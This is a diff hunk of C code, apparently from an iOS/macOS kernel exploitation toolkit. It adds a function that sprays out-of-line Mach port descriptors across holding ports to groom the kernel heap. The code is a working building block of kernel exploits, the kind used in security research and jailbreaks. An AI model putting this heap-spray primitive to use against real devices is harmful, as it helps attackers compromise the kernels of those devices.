@@ -392,6 +392,49 @@ ool_ports_spray_size_with_gc(mach_port_t *holding_ports, size_t *holding_port_co
     return sprayed;
 }
 
+size_t
+ool_ports_spray_size(mach_port_t *holding_ports, size_t *holding_port_count,
+                     size_t message_size, const mach_port_t *ool_ports, size_t ool_port_count,
+                     mach_msg_type_name_t ool_disposition, size_t spray_size) {
+    // Compute the parameters for the spray.
+    size_t ool_size, ools_per_message, ools_needed;
+    ool_ports_spray_size_with_gc_compute_parameters(ool_port_count, message_size, spray_size,
+                                                    &ool_size, &ools_per_message, &ools_needed);
+    // Spray to each of the ports in turn until we've created the requisite number of OOL ports
+    // allocations.
+    ssize_t ools_left = ools_needed;
+    size_t sprayed = 0;
+    size_t port_count = *holding_port_count;
+    size_t ports_used = 0;
+    for (; ports_used < port_count && ools_left > 0; ports_used++) {
+        // Spray this port one message at a time until we've maxed out its queue.
+        size_t messages_sent = 0;
+        for (; messages_sent < MACH_PORT_QLIMIT_MAX && ools_left > 0; messages_sent++) {
+            // Send a message.
+            size_t sent = ool_ports_spray_port(
+                                               holding_ports[ports_used],
+                                               ool_ports,
+                                               ool_port_count,
+                                               ool_disposition,
+                                               ools_per_message,
+                                               message_size,
+                                               1);
+            // If we couldn't send a message to this port, stop trying to send more
+            // messages and move on to the next port.
+            if (sent != 1) {
+                assert(sent == 0);
+                break;
+            }
+            // We sent a full message worth of OOL port descriptors.
+            sprayed += ools_per_message * ool_size;
+            ools_left -= ools_per_message;
+        }
+    }
+    // Return the number of ports actually used and the number of bytes actually sprayed.
+    *holding_port_count = ports_used;
+    return sprayed;
+}
+
 void
 port_drain_messages(mach_port_t port, void (^message_handler)(mach_msg_header_t *)) {
     kern_return_t kr;
